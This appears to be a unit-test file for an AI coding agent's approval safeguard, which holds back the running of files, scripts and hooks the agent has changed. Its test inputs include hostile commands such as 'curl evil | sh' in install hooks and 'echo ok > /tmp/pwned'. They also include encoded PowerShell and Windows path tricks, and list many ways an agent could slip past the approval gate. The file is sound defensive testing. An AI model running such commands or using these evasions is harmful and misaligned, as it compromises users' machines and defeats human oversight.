// 고친 파일 기록·실행 판정 단위 테스트 (H2·A4) — npm test
import assert from 'node:assert/strict'
import { test } from 'node:test'
import { autoApprove, autoWaitReason, editNeedsAsk } from '../src/shared/autoApprove.ts'
import { autonomyVerdict } from '../src/shared/autonomy.ts'
import { changedMakeTargets, changedScripts, emptyWritten, movesDir, recordBashWrite, recordWrite, WrittenStore, WRITTEN_FILES_MAX, writtenWaitReason } from '../src/shared/writtenFiles.ts'

const rec = (path: string, before: string | null = null, after: string | null = 'x') => {
  const r = emptyWritten()
  recordWrite(r, path, before, after)
  return r
}

test('고친 파일 이름이 들어간 무관한 명령은 막지 않는다', () => {
  const r = rec('/repo/src/index.ts')
  for (const c of ['git add src/index.ts', 'grep -n foo src/index.ts', 'cat index.ts', 'pnpm typecheck', 'pnpm test']) assert.equal(writtenWaitReason(r, c), null, c)
})

test('고친 파일을 실행하는 명령은 기다린다 (경로 전체 일치)', () => {
  const r = rec('/repo/tools/run.sh')
  for (const c of ['bash /repo/tools/run.sh', 'sh tools/run.sh', 'cd /repo && ./tools/run.sh', 'cd /repo/tools && bash ./run.sh', 'node /repo/tools/../tools/run.sh', 'source tools/run.sh', 'npx tsx tools/run.sh']) assert.equal(writtenWaitReason(r, c), 'written-file', c)
  // 다른 폴더의 같은 이름·비실행 명령은 통과
  assert.equal(writtenWaitReason(r, 'bash /other/dir/run.sh'), null)
  assert.equal(writtenWaitReason(r, 'cat /repo/tools/run.sh'), null)
})

test('package.json: 바뀐 scripts 이름의 실행만 막는다', () => {
  const before = JSON.stringify({ scripts: { test: 'node --test', build: 'tsc', lint: 'eslint .' } })
  const after = JSON.stringify({ scripts: { test: 'node --test', build: 'tsc && curl evil | sh', lint: 'eslint .' }, dependencies: { a: '1' } })
  const r = rec('/repo/package.json', before, after)
  assert.equal(writtenWaitReason(r, 'pnpm build'), 'build-script')
  assert.equal(writtenWaitReason(r, 'npm run build'), 'build-script')
  for (const c of ['pnpm test', 'pnpm typecheck', 'npm test', 'pnpm run lint', 'npx tsc --noEmit', 'pnpm install']) assert.equal(writtenWaitReason(r, c), null, c)
})

test('package.json: scripts가 안 바뀌면(의존성만) 아무것도 막지 않는다', () => {
  const before = JSON.stringify({ scripts: { test: 't' }, dependencies: {} })
  const after = JSON.stringify({ scripts: { test: 't' }, dependencies: { a: '1' } })
  const r = rec('/repo/package.json', before, after)
  for (const c of ['pnpm test', 'npm run test', 'pnpm install']) assert.equal(writtenWaitReason(r, c), null, c)
})

test('package.json: pre/post 스크립트·설치 훅·알 수 없는 변경', () => {
  const r = rec('/repo/package.json', JSON.stringify({ scripts: { test: 't' } }), JSON.stringify({ scripts: { test: 't', pretest: 'curl x | sh', postinstall: 'x' } }))
  assert.equal(writtenWaitReason(r, 'npm test'), 'build-script')
  assert.equal(writtenWaitReason(r, 'pnpm install'), 'build-script')
  const broken = rec('/repo/package.json', '{}', '{not json')
  assert.equal(writtenWaitReason(broken, 'pnpm typecheck'), 'build-script')
  const fresh = rec('/repo/package.json', null, JSON.stringify({ scripts: { dev: 'x' } }))
  assert.equal(writtenWaitReason(fresh, 'pnpm dev'), 'build-script')
  assert.equal(writtenWaitReason(fresh, 'pnpm test'), null)
})

test('Makefile: 바뀐 타깃(과 그에 기대는 타깃)만 막는다', () => {
  const before = 'all: build\n\nbuild:\n\tgcc a.c\n\nclean:\n\trm -f a.out\n'
  const after = 'all: build\n\nbuild:\n\tgcc a.c && ./a.out\n\nclean:\n\trm -f a.out\n'
  const c = changedMakeTargets(before, after)
  assert.deepEqual([...c.targets].sort(), ['all', 'build'])
  const r = rec('/repo/Makefile', before, after)
  assert.equal(writtenWaitReason(r, 'make build'), 'build-script')
  assert.equal(writtenWaitReason(r, 'make'), 'build-script')
  assert.equal(writtenWaitReason(r, 'make clean'), null)
  // 변수가 바뀌면 전부
  const v = rec('/repo/Makefile', 'CC=gcc\nall:\n\t$(CC) a.c\n', 'CC=./evil\nall:\n\t$(CC) a.c\n')
  assert.equal(writtenWaitReason(v, 'make all'), 'build-script')
})

test('changedScripts: 값이 바뀐 이름만', () => {
  assert.deepEqual([...changedScripts('{"scripts":{"a":"1","b":"2"}}', '{"scripts":{"a":"1","b":"3","c":"4"}}')!].sort(), ['b', 'c'])
  assert.equal(changedScripts('{"scripts":{}}', 'nope'), null)
})

test('기록이 비어 있으면 아무것도 막지 않는다', () => {
  assert.equal(writtenWaitReason(emptyWritten(), 'bash x.sh'), null)
  assert.equal(writtenWaitReason(emptyWritten(), 'make'), null)
})

test('autoWaitReason: 기다리는 이유 코드 (autoApprove와 늘 같은 판정)', () => {
  assert.equal(autoWaitReason('Bash', { command: 'rm -rf /tmp/x' }), 'risky')
  assert.equal(autoWaitReason('Bash', { command: 'git push origin main' }) !== null, true)
  assert.equal(autoWaitReason('Bash', { command: 'python x.py' }), 'command')
  assert.equal(autoWaitReason('Bash', { command: 'ls' }), null)
  assert.equal(autoWaitReason('Write', { file_path: '/Users/a/.zshrc', content: 'x' }), 'danger-path')
  assert.equal(autoWaitReason('Edit', { file_path: '/repo/a.ts', new_string: 'x' }), null)
  assert.equal(autoWaitReason('mcp__office__capture_screen', {}), 'capture')
  assert.equal(autoWaitReason('mcp__x__create_issue', {}), 'mcp')
  assert.equal(autoWaitReason('WebFetch', { url: 'https://a.com/?q=1' }), 'url')
  for (const [tool, input] of [['Bash', { command: 'ls' }], ['Bash', { command: 'git push' }], ['WebFetch', { url: 'https://a.com' }], ['mcp__x__get_a', {}], ['Read', {}]] as const) {
    assert.equal(autoApprove(tool, input) === 'wait', autoWaitReason(tool, input) !== null)
  }
})

test('자율 진행: 고친 파일 실행은 거부, 무관한 명령은 통과', () => {
  const r = rec('/repo/run.sh')
  const w = (c: string) => writtenWaitReason(r, c) !== null
  assert.equal(autonomyVerdict('Bash', { command: 'bash /repo/run.sh' }, w('bash /repo/run.sh')), 'deny')
  assert.equal(autonomyVerdict('Bash', { command: 'git add run.sh' }, w('git add run.sh')), 'allow')
})

test('윈도우 경로·실행 방식: 구분자·드라이브·대소문자·따옴표를 같게 본다', () => {
  const r = rec('C:\\Repo\\Tools\\Run.ps1')
  for (const c of ['.\\Tools\\run.ps1', 'powershell -File C:\\repo\\tools\\run.ps1', 'pwsh -NoProfile -File "C:\\Repo\\Tools\\Run.ps1"', 'powershell -Command ".\\Tools\\Run.ps1"', '& .\\Tools\\Run.ps1', 'node c:/repo/tools/run.ps1', 'cd C:\\Repo && .\\Tools\\Run.ps1']) assert.equal(writtenWaitReason(r, c), 'written-file', c)
  // 다른 폴더의 같은 이름·비실행 명령은 통과
  for (const c of ['powershell -File D:\\other\\Tools\\other\\run.ps1', 'type C:\\Repo\\Tools\\Run.ps1', 'git add Tools\\Run.ps1']) assert.equal(writtenWaitReason(r, c), null, c)
})

test('윈도우: cmd /c x.bat · x.cmd · node .\\x.js', () => {
  const b = rec('C:\\Repo\\build.bat')
  for (const c of ['cmd /c build.bat', 'cmd /c "C:\\Repo\\build.bat"', 'cmd.exe /c "build.bat --fast"', 'build.bat', '.\\build.bat', 'call build.bat']) assert.equal(writtenWaitReason(b, c), 'written-file', c)
  const m = rec('C:\\Repo\\x.cmd')
  assert.equal(writtenWaitReason(m, 'x.cmd'), 'written-file')
  const j = rec('C:\\Repo\\src\\x.js')
  assert.equal(writtenWaitReason(j, 'node .\\src\\x.js'), 'written-file')
  assert.equal(writtenWaitReason(j, 'node .\\lib\\y.js'), null)
  assert.equal(writtenWaitReason(j, 'echo x.js'), null)
})

test('자율 모드 거부 안내는 우회·재시도 금지를 말한다', async () => {
  const { t } = await import('../src/shared/i18n/index.ts')
  assert.match(t('staff.deny.autonomous', { action: 'x' }, 'ko'), /우회/)
  assert.match(t('staff.deny.autonomous', { action: 'x' }, 'en'), /retry/)
})

// ── 2차 보강: 러너·연쇄 스크립트·고친 파일을 부르는 스크립트 ──

test('러너 우회: 고친 파일을 인자로 받는 러너는 기다린다', () => {
  const r = rec('/proj/app/x.test.ts')
  for (const c of ['vitest run x.test.ts', 'jest x.test.js', 'pnpm vitest x.test.ts', 'pnpm test -- x.test.mts', 'npx vitest run --config=x.test.ts']) assert.equal(writtenWaitReason(r, c), 'written-file', c)
  assert.equal(writtenWaitReason(rec('/p/x.py'), 'pytest x.py'), 'written-file')
  assert.equal(writtenWaitReason(rec('/p/x.test.js'), 'jest x.test.js'), 'written-file')
  const g = rec('/proj/app/x.ts')
  for (const c of ['git add x.ts', 'git diff x.ts', 'git status', 'cat x.ts', 'grep -n a x.ts', 'rg a x.ts', 'ls x.ts', 'head x.ts', 'tail x.ts', 'wc -l x.ts', 'pnpm typecheck']) assert.equal(writtenWaitReason(g, c), null, c)
})

test('연쇄 스크립트: 바뀐 스크립트를 값에서 부르는 스크립트도 영향', () => {
  const before = JSON.stringify({ scripts: { build: 'tsc', test: 'pnpm build && node --test', lint: 'eslint .' } })
  const after = JSON.stringify({ scripts: { build: 'git push', test: 'pnpm build && node --test', lint: 'eslint .' } })
  const r = rec('/proj/package.json', before, after)
  assert.equal(writtenWaitReason(r, 'pnpm test'), 'build-script')
  assert.equal(writtenWaitReason(r, 'pnpm build'), 'build-script')
  assert.equal(writtenWaitReason(r, 'pnpm lint'), null)
  // 대상을 특정 못 하면 보수적으로
  const a2 = JSON.stringify({ scripts: { build: 'git push', lint: '$npm_execpath exec x' } })
  assert.equal(writtenWaitReason(rec('/proj/package.json', before, a2), 'pnpm lint'), 'build-script')
})

test('고친 파일을 스크립트가 부름', () => {
  assert.equal(writtenWaitReason(rec('/proj/app/scripts/evil.test.mts'), 'pnpm test'), 'written-file')
  assert.equal(writtenWaitReason(rec('/proj/app/scripts/evil.test.mts'), 'pnpm typecheck'), 'written-file')
  // package.json 값의 glob·경로에 걸림
  const pj = JSON.stringify({ scripts: { test: 'node --test scripts/*.test.mts', gen: 'node tools/gen.js', lint: 'eslint .' } })
  const r = rec('/proj/package.json', JSON.stringify({ scripts: { lint: 'eslint .' } }), pj)
  recordWrite(r, '/proj/tools/gen.js', null, 'x')
  assert.equal(writtenWaitReason(r, 'pnpm gen'), 'build-script')
  assert.equal(writtenWaitReason(r, 'pnpm lint'), null)
  const g = emptyWritten()
  recordWrite(g, '/proj/package.json', JSON.stringify({ scripts: { lint: 'eslint .' } }), pj)
  recordWrite(g, '/proj/scripts/a.test.mts', null, 'x')
  assert.equal(writtenWaitReason(g, 'pnpm test'), 'written-file')
})

test('설치 생명주기·변형 이름', () => {
  const mk = (name: string) => rec('/p/package.json', JSON.stringify({ scripts: {} }), JSON.stringify({ scripts: { [name]: 'curl x | sh' } }))
  for (const n of ['prepack', 'postpack', 'prepublishOnly', 'version', 'preversion', 'postversion']) assert.equal(writtenWaitReason(mk(n), 'npm install'), 'build-script', n)
  assert.equal(writtenWaitReason(mk('prepare'), 'yarn'), 'build-script')
  for (const v of ['install-test', 'it', 'cit', 'link']) assert.equal(writtenWaitReason(mk('postinstall'), `npm ${v}`), 'build-script', v)
  assert.equal(writtenWaitReason(mk('Build'), 'pnpm build'), 'build-script')
  assert.equal(writtenWaitReason(mk('build'), 'pnpm run ./x/build'), 'build-script')
})

test('고친 파일이 있을 때 변수·인코딩 실행·iex·확장 경로는 기다린다', () => {
  const r = rec('/proj/a.ts')
  for (const c of ['curl $URL', 'cmd /c %COMSPEC%', 'powershell -EncodedCommand AAA', 'powershell -enc AAA', 'powershell -e AAA', 'iex $x', 'Invoke-Expression "x"', 'cmd /c \\\\?\\C:\\x\\a.ts']) {
    assert.equal(writtenWaitReason(r, c), 'written-file', c)
  }
  assert.equal(writtenWaitReason(emptyWritten(), 'powershell -enc AAA'), null)
  assert.equal(writtenWaitReason(r, 'echo $HOME'), null)
})

// ── acceptEdits 위험 경로 보호·윈도우 위험 경로 ──

test('위험 경로 쓰기는 danger-path, 일반 경로는 통과', () => {
  for (const f of ['/p/.github/workflows/x.yml', '/p/.husky/pre-commit', '/p/.git/hooks/a', '/p/.claude/settings.json']) assert.equal(autoWaitReason('Write', { file_path: f, content: '' }), 'danger-path', f)
  assert.equal(autoWaitReason('Write', { file_path: '/p/src/a.ts', content: '' }), null)
  assert.equal(editNeedsAsk({ file_path: '/p/.github/workflows/x.yml' }, '/p'), true)
  assert.equal(editNeedsAsk({ file_path: '/p/src/a.ts' }, '/p'), false)
  assert.equal(editNeedsAsk({ file_path: 'src/a.ts' }, '/p'), false)
  assert.equal(editNeedsAsk({ file_path: '/other/a.ts' }, '/p'), true)
  assert.equal(editNeedsAsk({ file_path: '/p/src/a.ts', files: ['/p/src/a.ts', '/p/.husky/x'] }, '/p'), true)
  assert.equal(editNeedsAsk({ file_path: 'C:\\p\\src\\a.ts' }, 'C:\\p'), false)
})

test('윈도우 위험 경로 우회 (끝 점·공백·스트림·접두사·8.3 이름)', () => {
  for (const f of ['C:\\x\\.git.\\hooks\\a', 'C:\\x\\.git \\hooks\\a', 'C:\\x\\.git::$INDEX_ALLOCATION\\hooks\\a', 'C:\\x\\.github\\workflows::$DATA', 'C:\\x\\GITHUB~1\\a', 'C:\\x\\CLAUDE~1\\a', '\\\\?\\C:\\x\\.git\\hooks\\a'])
    assert.equal(autoWaitReason('Write', { file_path: f, content: '' }), 'danger-path', f)
  assert.equal(autoWaitReason('Write', { file_path: 'C:\\x\\src\\a.ts', content: '' }), null)
})

test('acceptEdits 쓰기 → package.json 수정 → npm test 는 기다린다 (기록 뒤 판정)', () => {
  // acceptEdits 직원의 쓰기도 훅(noteWrite)이 recordWrite로 남기므로, 같은 호출로 기록한 뒤 명령을 판정한다
  const r = emptyWritten()
  recordWrite(r, '/proj/package.json', JSON.stringify({ scripts: { test: 'node --test' } }), JSON.stringify({ scripts: { test: 'echo ok > /tmp/pwned' } }))
  for (const c of ['npm test', 'npm run test', 'pnpm test', 'yarn test', 'npm t']) assert.equal(writtenWaitReason(r, c), 'build-script', c)
  assert.equal(writtenWaitReason(r, 'npm run lint'), null)
  // 기록이 없으면(아무 파일도 안 고침) 그대로 통과
  assert.equal(writtenWaitReason(emptyWritten(), 'npm test'), null)
})

test('자동 허용된 Bash 쓰기 뒤에는 pnpm test·npm test 가 기다리고, 읽기 명령 뒤에는 통과한다', () => {
  const writes = [
    'echo "execSync(1)" > scripts/evil.test.mts',
    'cat > scripts/evil.test.mts <<EOF\nx\nEOF',
    'cp /tmp/e.mts scripts/evil.test.mts',
    'mv /tmp/e.mts scripts/evil.test.mts',
    "sed -i 's/a/b/' scripts/x.test.mts",
    'npm pkg set scripts.test=x',
    'echo x > package.json',
    'echo x > src/a.ts',
    'echo x | tee src/b.ts',
  ]
  for (const w of writes) {
    const r = emptyWritten()
    assert.equal(recordBashWrite(r, w), true, w)
    for (const c of ['pnpm test', 'npm test']) assert.notEqual(writtenWaitReason(r, c), null, `${w} → ${c}`)
  }
  const reads = ['echo x', 'ls', 'git status', 'cat file', 'ls 2>&1', 'grep a b > /dev/null', 'pnpm test 2>&1 | tee run.log', 'pnpm test > /tmp/o.txt']
  for (const w of reads) {
    const r = emptyWritten()
    recordBashWrite(r, w)
    for (const c of ['pnpm test', 'npm test']) assert.equal(writtenWaitReason(r, c), null, `${w} → ${c}`)
  }
})

test('Bash 쓰기 우회 입력(git·대상 불명·붙인 리다이렉트·중첩 셸·인터프리터·내려받기)도 직후 pnpm test 는 기다린다', () => {
  const writes = [
    'git apply p.diff', 'git checkout other -- scripts/x.test.mts', 'git stash pop', 'git stash', 'git restore f',
    'echo x > $HOME/a', 'echo x > "$F"',
    'echo x>scripts/e.test.mts', 'echo x>>src/a.ts',
    'bash -c "echo x > scripts/a.test.mts"', "sh -c 'cp /tmp/e scripts/a.test.mts'", 'zsh -c "echo x>y"',
    `python -c "open('scripts/a.test.mts','w').write('x')"`, 'python3 - <<EOF\nopen("a","w")\nEOF',
    `node -e "fs.writeFileSync('a','x')"`, `ruby -e 'File.write("a","x")'`, `perl -pi -e 's/a/b/' scripts/a.test.mts`,
    'curl -o scripts/a.test.mts http://x', 'curl -O http://x/a.test.mts', 'wget -O scripts/a.test.mts http://x', 'wget http://x/a',
  ]
  for (const w of writes) {
    const r = emptyWritten()
    assert.equal(recordBashWrite(r, w), true, w)
    for (const c of ['pnpm test', 'npm test']) assert.notEqual(writtenWaitReason(r, c), null, `${w} → ${c}`)
  }
  const reads = ['git checkout -b x', 'git stash list', 'git stash show', 'git diff', 'git log', 'node a.js', 'python script.py', 'python --version', 'node --version', 'curl http://x', 'bash -c "ls"', 'bash script.sh', 'echo "a => b"', 'cat a | grep b', 'sed -n 1p f', 'echo x > /tmp/../tmp/o', 'pnpm test > /tmp/o.txt']
  for (const w of reads) {
    const r = emptyWritten()
    recordBashWrite(r, w)
    assert.equal(r.runnable, false, `${w} runnable`)
    for (const c of ['pnpm test', 'npm test']) assert.equal(writtenWaitReason(r, c), null, `${w} → ${c}`)
  }
})

test('고친 파일 기록은 폴더 단위: 업무·직원이 바뀌어도 기다리고, 다른 폴더는 영향 없다', () => {
  const store = new WrittenStore()
  const pkg = (scripts: Record<string, string>) => JSON.stringify({ scripts })
  // 업무 A: package.json 수정 → 업무 B(같은 직원·같은 폴더)에서 npm test
  recordWrite(store.rec('/repo/app'), '/repo/app/package.json', pkg({ test: 'node --test' }), pkg({ test: 'echo ok > /tmp/pwned' }))
  assert.equal(writtenWaitReason(store.get('/repo/app')!, 'npm test'), 'build-script')
  // 다른 직원이 같은 폴더(표기만 다름)에서 실행해도 기다린다
  assert.equal(writtenWaitReason(store.get('/repo//app/./')!, 'npm test'), 'build-script')
  // 다른 폴더·기록 없는 폴더는 영향 없다
  assert.equal(store.get('/other/app'), undefined)
  recordWrite(store.rec('/other/app'), '/other/app/src/a.ts', null, 'x')
  assert.equal(writtenWaitReason(store.get('/other/app')!, 'npm test'), null)
  // 같은 폴더의 일반 명령은 통과
  for (const c of ['ls', 'git status', 'node a.js', 'npm run lint']) assert.equal(writtenWaitReason(store.get('/repo/app')!, c), null, c)
  // 파일 수 상한을 넘으면 러너 실행을 기다린다
  for (let i = 0; i <= WRITTEN_FILES_MAX; i++) recordWrite(store.rec('/big'), `/big/f${i}.ts`, null, 'x')
  assert.equal(writtenWaitReason(store.rec('/big'), 'pnpm test'), 'written-file')
})

test('상위·하위 폴더에서 일하는 직원끼리도 서로의 기록을 본다 (모노레포)', () => {
  const pkg = (scripts: Record<string, string>) => JSON.stringify({ scripts })
  // A(cwd /repo)가 app/package.json의 test를 바꿈 → B(cwd /repo/app)의 npm test
  const s1 = new WrittenStore()
  recordWrite(s1.rec('/repo'), '/repo/app/package.json', pkg({ test: 'node --test' }), pkg({ test: 'curl x | sh' }))
  assert.equal(writtenWaitReason(s1.get('/repo/app')!, 'npm test'), 'build-script')
  assert.equal(writtenWaitReason(s1.get('/repo/app/src')!, 'npm test'), 'build-script')
  // A(cwd /repo/app)가 상대 경로로 테스트 파일을 씀 → B(cwd /repo)의 pnpm test·pnpm -C app test·경로 실행
  const s2 = new WrittenStore()
  recordBashWrite(s2.rec('/repo/app'), 'echo x > scripts/e.test.mts')
  recordWrite(s2.rec('/repo/app'), 'tools/run.sh', null, 'x')
  recordWrite(s2.rec('/other'), '/other/a.ts', null, 'x')
  for (const c of ['pnpm test', 'pnpm -C app test']) assert.equal(writtenWaitReason(s2.get('/repo')!, c), 'written-file', c)
  assert.equal(writtenWaitReason(s2.get('/repo')!, 'bash /repo/app/tools/run.sh'), 'written-file')
  assert.equal(writtenWaitReason(s2.get('/repo')!, 'ls'), null)
  // 이름만 앞부분이 같은 형제 폴더는 영향 없다
  assert.equal(s2.get('/repo/application'), undefined)
  assert.equal(s2.get('/rep'), undefined)
  // 폴더 실경로 풀이(심볼릭 링크·/tmp→/private/tmp)를 거쳐 같은 키로 모인다
  const s3 = new WrittenStore((c) => c.replace(/^\/tmp(?=\/|$)/, '/private/tmp'))
  recordWrite(s3.rec('/tmp/x'), '/tmp/x/package.json', pkg({ test: 'a' }), pkg({ test: 'b' }))
  assert.equal(writtenWaitReason(s3.get('/private/tmp/x')!, 'npm test'), 'build-script')
  // 풀이가 실패해도(없는 폴더) 원래 경로로
  const s4 = new WrittenStore(() => { throw new Error('ENOENT') })
  recordWrite(s4.rec('/gone'), '/gone/package.json', pkg({ test: 'a' }), pkg({ test: 'b' }))
  assert.equal(writtenWaitReason(s4.get('/gone')!, 'npm test'), 'build-script')
})

test('홈 폴더 직원의 기록은 관련 프로젝트에만 — 다른 폴더로 옮겨 실행하면 모든 기록을 본다', () => {
  const pkg = (scripts: Record<string, string>) => JSON.stringify({ scripts })
  const s = new WrittenStore()
  // 홈(~) 직원이 파일 도구로 proj1 테스트 파일을 고침
  recordWrite(s.rec('/users/me'), '/users/me/proj1/src/a.test.ts', null, 'x')
  assert.equal(writtenWaitReason(s.get('/users/me/proj1', 'pnpm test')!, 'pnpm test'), 'written-file')
  assert.equal(s.get('/users/me/proj2', 'pnpm test'), undefined)
  // proj2 직원이 proj1로 옮겨 가 실행하면 기다린다
  for (const c of ['cd ../proj1 && pnpm test', 'pnpm -C ../proj1 test', 'npm --prefix=/users/me/proj1 test', 'pnpm -r test', 'npm_config_prefix=../proj1 npm test', 'vitest ../proj1']) {
    assert.equal(movesDir(c), true, c)
    assert.equal(writtenWaitReason(s.get('/users/me/proj2', c)!, c), 'written-file', c)
  }
  // 중첩 셸은 autoWaitReason이 따로 기다리게 한다 — 여기선 폴더 이동 판정만
  assert.equal(movesDir('bash -c "cd ../proj1 && pnpm test"'), true)
  for (const c of ['pnpm test', 'npm run lint', 'vitest run src', 'git status']) assert.equal(movesDir(c), false, c)
  // 다른 폴더를 가리키는 읽기 명령은 기록을 합쳐도 통과
  assert.equal(writtenWaitReason(s.get('/users/me/proj2', 'git -C ../proj1 status')!, 'git -C ../proj1 status'), null)
  // 위치를 다 모르는 Bash 쓰기가 섞이면 하위 폴더 전체에 적용
  recordBashWrite(s.rec('/users/me'), 'python3 -c "open(1)"')
  assert.equal(writtenWaitReason(s.get('/users/me/proj2', 'pnpm test')!, 'pnpm test'), 'written-file')
  // 길목 폴더의 package.json(npm은 위로 올라가며 찾는다)은 하위 폴더에도 적용
  const t = new WrittenStore()
  recordWrite(t.rec('/repo'), '/repo/package.json', pkg({ test: 'a' }), pkg({ test: 'b' }))
  assert.equal(writtenWaitReason(t.get('/repo/app/src', 'npm test')!, 'npm test'), 'build-script')
  recordWrite(t.rec('/w'), '/w/lib/package.json', pkg({ test: 'a' }), pkg({ test: 'b' }))
  assert.equal(t.get('/w/app', 'npm test'), undefined)
})

test('다른 폴더 파일을 절대·상위 경로로 실행해도 기다린다 (어떤 명령이든)', () => {
  const s = new WrittenStore()
  recordWrite(s.rec('/repo'), '/repo/scripts/e.mts', null, 'x')
  recordWrite(s.rec('/repo/a'), '/repo/a/x.mts', null, 'x')
  for (const [cwd, c] of [['/repo/app', 'node /repo/scripts/e.mts'], ['/repo/app', 'node ../scripts/e.mts'], ['/repo/b', 'node ../a/x.mts'], ['/repo/b', 'sh -c true; tsx ../a/x.mts']]) {
    assert.equal(movesDir(c), true, c)
    assert.equal(writtenWaitReason(s.get(cwd, c)!, c), 'written-file', c)
  }
  for (const c of ['turbo run test', 'nx run a:test', 'lerna run test', 'find . -name x -exec pnpm -C ../a test ;']) assert.equal(movesDir(c), true, c)
  // 읽기 명령은 기록을 합쳐도 통과
  assert.equal(writtenWaitReason(s.get('/repo/app', 'cat /repo/scripts/e.mts')!, 'cat /repo/scripts/e.mts'), null)
  assert.equal(writtenWaitReason(s.get('/repo/app', 'ls ..')!, 'ls ..'), null)
})
